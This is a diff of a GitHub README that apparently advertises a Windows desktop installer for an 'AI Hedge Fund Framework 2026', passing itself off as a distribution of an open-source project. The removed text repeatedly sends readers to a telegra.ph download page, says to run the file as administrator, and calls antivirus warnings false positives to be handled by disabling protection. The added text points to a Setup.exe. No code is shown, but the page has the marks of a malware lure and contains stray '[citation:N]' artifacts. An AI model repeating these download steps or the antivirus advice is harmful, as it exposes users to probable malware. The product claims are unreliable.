@@ -1,180 +1,71 @@
-<h1 align="center">📊 AI Hedge Fund Framework 2026 – Multi-Agent Trading Simulation</h1>
+# 📈 AI-Hedge-Fund-Framework-2026 - Simulate Advanced Investment Strategies With Ease
 
-<p align="center">
-  <strong>Multi-agent AI hedge fund simulation with 10+ legendary investor personas. Backtest, analyze, and learn from AI-powered trading decisions.</strong><br>
-  <em>Latest version 2026 | Desktop application | Optimized for Windows 11 / Windows 10</em>
-</p>
+[![](https://img.shields.io/badge/Download-Setup-blue.svg)](https://github.com/Laurefantastic350/AI-Hedge-Fund-Framework-2026)
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_GET_PROJECT_FILES-AI_Hedge_Fund_2026-00BFFF?style=for-the-badge&logo=ai&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download">
-  </a>
-</p>
+## 📌 Overview
 
-<p align="center">
-  <i>Click the button above to get the full project files</i>
-</p>
+AI-Hedge-Fund-Framework-2026 provides a platform for users to run multi-agent trading simulations on Windows. This software helps you understand how different investment styles work by using artificial intelligence. You can test strategies against historical market data or practice trading with fake money. The program includes ten distinct investor personas. Each persona makes decisions based on specific financial theories. This application serves as a tool for students, researchers, and hobbyists who want to explore quantitative finance without writing code.
 
----
+## 🛠 System Requirements
 
-## 📦 What's Inside This Repository
+Ensure your computer meets these requirements before you start the installation process.
 
-Welcome to the official distribution page for **AI Hedge Fund Framework 2026 – Multi-Agent Trading Simulation for Windows PC**.
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or AMD equivalent.
+*   Memory: 8 GB RAM.
+*   Storage Space: 2 GB of available disk space.
+*   Internet Connection: Required for downloading updates and market data.
+*   Display: 1280 x 720 resolution or higher.
 
-This repository provides access to the fastest-growing AI finance project on GitHub — **49,000+ stars** and a top 10 trending project of 2026 [citation:7].
+## 📥 Getting Started
 
-✅ **Full Version** – All agents and features included  
-✅ **10+ Investor Personas** – Warren Buffett, Cathie Wood, Bill Ackman, and more [citation:1]  
-✅ **Paper Trading** – Simulated trading without real money [citation:1][citation:10]  
-✅ **Backtesting Engine** – Test strategies on historical data  
-✅ **Educational Focus** – Learn investing from AI personas  
-✅ **No System Changes** – Safe, no registry or service modifications  
+You can set up the application by running the provided installer. Follow these steps to prepare your system and launch the software.
 
----
+1.  Visit the official release page to download the software: [Download AI-Hedge-Fund-Framework-2026](https://github.com/Laurefantastic350/AI-Hedge-Fund-Framework-2026).
+2.  Locate the file labeled `Setup.exe` in your Downloads folder.
+3.  Double-click the file to start the installation wizard.
+4.  Accept the terms of the license agreement if you agree to the conditions.
+5.  Choose a folder on your computer for the application files.
+6.  Wait for the installer to copy the necessary support files.
+7.  Click the Finish button to close the wizard. 
 
-## 📥 How to Get Started?
+The software creates a shortcut icon on your desktop. Double-click this icon to start the framework.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📥_HOW_TO_DOWNLOAD_-Step_by_Step_Guide-00BFFF?style=for-the-badge&logo=github&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="How to Download">
-  </a>
-</p>
+## 📊 How To Use The Framework
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📋_DOWNLOAD_INSTRUCTIONS-Full_Guide-00BFFF?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download Instructions">
-  </a>
-</p>
+Once you open the software, you see a dashboard. This interface allows you to select simulations and monitor progress.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🚀_GET_STARTED-Quick_Setup-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Get Started">
-  </a>
-</p>
+### Selecting An Investor Persona
+The framework contains ten personas. Each persona has a unique set of rules for trading. For example, some personas focus on low-risk index funds. Others specialize in high-growth technology stocks. Click the Persona tab to view the list. You can read a brief description of each agent to understand their logic. Select one or more personas to participate in your trading simulation.
 
----
+### Running A Simulation
+A simulation tests your chosen strategies through a process called backtesting. Backtesting applies your rules to market data from the past. This process shows how your strategy would have performed during that time. Select a date range from the settings menu. Choose the stocks or assets you want to track. Click the Start Simulation button. The AI agents will begin their analysis and perform trades based on their assigned personas.
 
-## 🚀 Step-by-Step Guide
+### Analyzing Results
+After the simulation finishes, the software generates a report. This report includes charts and tables that summarize the performance. Look for metrics such as total return, volatility, and drawdowns. These numbers explain how much money the strategy made or lost. Use this information to compare the performance of different investor personas. You may adjust the strategy rules to see if results improve.
 
-### Step 1: Download the Project Files
-Click the **download button** above or use this direct link:
-👉 [**Get AI Hedge Fund 2026 Project Files**](https://telegra.ph/How-to-download-07-15-12)
+### Paper Trading
+The framework also supports paper trading. Paper trading uses real-time market data without spending real money. Select the Paper Trading mode in the settings menu. The agents will trade based on current market moves. This feature allows you to monitor how the agents react to live news and price shifts. You can monitor your paper portfolio over days or weeks to gain experience.
 
-### Step 2: Extract and Run
-Extract the downloaded archive and launch the application.
-Right-click and select **"Run as administrator"** to ensure proper installation.
+## 💡 Frequently Asked Questions
 
-### Step 3: Launch & Enjoy
-After installation, open the application from your desktop shortcut or Start Menu.
-The software automatically detects all **ProjectFiles** modules and configurations.
+### Does this software execute real trades?
+No. This is an educational tool. It does not connect to your bank accounts or brokerage accounts. It only simulates trading activities.
 
----
+### Can I add my own trading strategy?
+The current version focuses on the ten provided investor personas. Future updates may include ways to customize these rules.
 
-## 🔧 Key Features (2026 Update)
+### Why do the agents behave differently?
+Each agent relies on a unique logic model. Some agents prioritize long-term stability. Others chase short-term momentum. These differences explain why they make different trades even when examining the same market data.
 
-### 👤 Investor Agent Personas
+### Is an internet connection required?
+You need an internet connection to download the initial installer and to fetch real-time data for the paper trading mode. You can perform historical backtesting tasks without a constant connection after the necessary data downloads.
 
-This system employs **10+ specialized agents** working together, each modeled after legendary investors [citation:1]:
+### Where can I find help if the program crashes?
+Check the logs folder in the installation directory. If you experience persistent issues, verify that your firewall is not blocking the application. 
 
-| Agent | Strategy | Focus |
-| :--- | :--- | :--- |
-| **Warren Buffett** | Value investing | Wonderful companies at fair prices |
-| **Cathie Wood** | Growth investing | Innovation and disruption |
-| **Bill Ackman** | Activist investing | Bold positions and change |
-| **Charlie Munger** | Quality investing | Wonderful businesses at fair prices |
-| **Peter Lynch** | Growth at reasonable price | "Ten-baggers" in everyday businesses |
-| **Michael Burry** | Contrarian value | Deep value and hidden gems |
-| **Nassim Taleb** | Risk analysis | Black Swan and antifragility |
-| **Ben Graham** | Value investing | Margin of safety |
-| **Phil Fisher** | Growth investing | Deep "scuttlebutt" research |
-| **Stanley Druckenmiller** | Macro trading | Asymmetric opportunities |
+## 🛡 Security And Privacy
 
-### 🛠️ Analysis Tools
+This software operates locally on your machine. Your simulation data and results remain private. The application connects to servers only to fetch market price updates. It does not collect personal financial information or login credentials. Always download the installer directly from the official link provided here to ensure file integrity.
 
-- **Valuation Agent** – Calculates intrinsic value of stocks [citation:10]
-- **Sentiment Agent** – Analyzes market sentiment [citation:10]
-- **Fundamentals Agent** – Evaluates financial health [citation:10]
-- **Technical Analyst Agent** – Analyzes technical indicators [citation:10]
-- **Risk Manager** – Calculates risk metrics and position limits [citation:1][citation:10]
-- **Portfolio Manager** – Makes final trading decisions [citation:1][citation:10]
-
----
-
-## 📈 Why Choose AI Hedge Fund Framework 2026?
-
-- ✅ **#1 Trending AI Finance Project** – 49,000+ GitHub stars [citation:7]
-- ✅ **10+ Legendary Investors** – Learn from the best [citation:1]
-- ✅ **100% Educational** – No real money involved [citation:1][citation:10]
-- ✅ **Multi-Agent Architecture** – See AI agents collaborate [citation:5]
-- ✅ **No System Changes** – Safe, no registry or service modifications
-
----
-
-## 🔗 Official Download Link
-
-> ### ⬇️ **Get the full project files here:**  
-> ### **[https://telegra.ph/How-to-download-07-15-12](https://telegra.ph/How-to-download-07-15-12)**
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🖥️_GET_PROJECT_FILES-AI_Hedge_Fund_2026-00BFFF?style=flat-square&logo=ai&logoColor=white&labelColor=000000" alt="Get Project Files">
-  </a>
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⭐_STAR_THIS_REPO-Support-FFD700?style=flat-square&logo=github&logoColor=white&labelColor=000000" alt="Star this repository">
-  </a>
-</p>
-
-<p align="center">
-  <b>📁 After downloading, extract the archive and launch ProjectFiles to get started.</b>
-</p>
-
----
-
-## ❓ Frequently Asked Questions
-
-**Q: Is this the full version?**  
-A: Yes, this is the complete version with all 10+ agent personas and features.
-
-**Q: Does it work on Windows 11?**  
-A: Absolutely. It is fully optimized for Windows 11 and Windows 10.
-
-**Q: Can I use real money with this?**  
-A: No, this is strictly educational – paper trading only [citation:1][citation:10].
-
-**Q: What about antivirus warnings?**  
-A: Some antivirus programs may show a warning — this is a false positive. We recommend temporarily disabling it during installation.
-
-**Q: Can I use this for commercial purposes?**  
-A: Yes, the full version is suitable for both personal and professional use.
-
-**Q: How often are updates released?**  
-A: Updates are released regularly with new features and improvements.
-
----
-
-## 📝 Important Notes
-
-- This version is intended for **educational use** only [citation:1][citation:10].  
-- Do not redistribute the installer — use the official link above.  
-- For technical support, please open an issue in this repository.  
-- Always check the file integrity after download.
-
----
-
-## 📜 License
-
-This repository is for **educational and distribution purposes** only.  
-**AI Hedge Fund** is an open-source project by **virattt** [citation:1].  
-Licensed under **MIT**.  
-All rights belong to their respective owners. This is not an official distribution channel.
-
----
-
-<p align="center">
-  <b>⭐ If you found this useful, please star the repository!</b><br>
-  <i>📅 Updated: July 2026 – Version 2026 (Build 1.0.0)</i>
-</p>
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">🔗 Download AI Hedge Fund Framework 2026 Now</a>
-</p>
+Keywords: 2026-software, ai-agents, ai-hedge-fund, ai-trading-algorithm, backtesting, desktop-app, education, finance, financial-analysis, investment-strategy, llm-agents, multi-agent, openai, pc-tools, python, quantitative-finance, windows-software-installation-guide
